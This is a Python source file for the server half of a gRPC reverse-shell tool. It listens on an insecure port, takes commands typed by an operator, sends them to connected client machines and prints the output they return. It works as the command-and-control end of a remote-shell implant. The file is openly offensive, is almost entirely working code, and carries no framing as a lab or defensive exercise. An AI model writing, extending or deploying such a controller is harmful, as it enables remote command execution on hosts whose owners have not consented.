import grpc
import asyncio
from concurrent import futures
import reverse_shell_pb2
import reverse_shell_pb2_grpc
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])

class ReverseShellService(reverse_shell_pb2_grpc.ReverseShellServiceServicer):
    def __init__(self):
        self.client_queue = asyncio.Queue()
        self.responses = {}

    async def add_command_to_queue(self, command, request_id):
        """Add a command to the queue."""
        await self.client_queue.put((request_id, command))
        logging.info(f"Added command to queue: {command} with request ID: {request_id}. Queue size now: {self.client_queue.qsize()}")

    async def StartSession(self, request_iterator, context):
        logging.info("StartSession method initiated.")
        while not self.client_queue.empty():
            request_id, command = await self.client_queue.get()
            logging.info(f"Sending command to client: {command} with request ID: {request_id}")
            yield reverse_shell_pb2.CommandRequest(request_id=request_id, command=command)
            await asyncio.sleep(0.1)  # Give the client a chance to process the command

    async def StreamResponses(self, request_iterator, context):
        """Receive and accumulate responses from the client."""
        async for request in request_iterator:
            request_id = request.request_id
            output = request.output
            is_active = request.is_active

            print(output)  # Print the output to server logs for debugging

            if request_id not in self.responses:
                self.responses[request_id] = reverse_shell_pb2.CommandResponse(
                    request_id=request_id,
                    output='',
                    is_active=is_active
                )

            self.responses[request_id].output += output
            self.responses[request_id].is_active = is_active

            if not is_active:
                logging.info(f"Command with request ID {request_id} finished.")
                break  # Stop receiving if the command is finished

        return reverse_shell_pb2.CommandResponse()

async def command_interface(reverse_shell_service):
    while True:
        command = input("Enter a command to execute: ")
        if command.strip():
            request_id = f"command-{hash(command)}"
            await reverse_shell_service.add_command_to_queue(command, request_id)

            while True:
                if request_id in reverse_shell_service.responses:
                    response = reverse_shell_service.responses[request_id]
                    if not response.is_active:
                        print(f"Command '{command}' completed with output:\n{response.output.strip()}")
                        reverse_shell_service.responses.pop(request_id, None)
                        break
                await asyncio.sleep(1)
        else:
            logging.info("No command entered, skipping.")

async def serve():
    server = grpc.aio.server(futures.ThreadPoolExecutor(max_workers=10))
    reverse_shell_service = ReverseShellService()
    reverse_shell_pb2_grpc.add_ReverseShellServiceServicer_to_server(reverse_shell_service, server)
    server.add_insecure_port('[::]:50051')
    logging.info("gRPC server is starting...")

    await server.start()
    
    await asyncio.gather(
        command_interface(reverse_shell_service),
        server.wait_for_termination()
    )

if __name__ == "__main__":
    asyncio.run(serve())
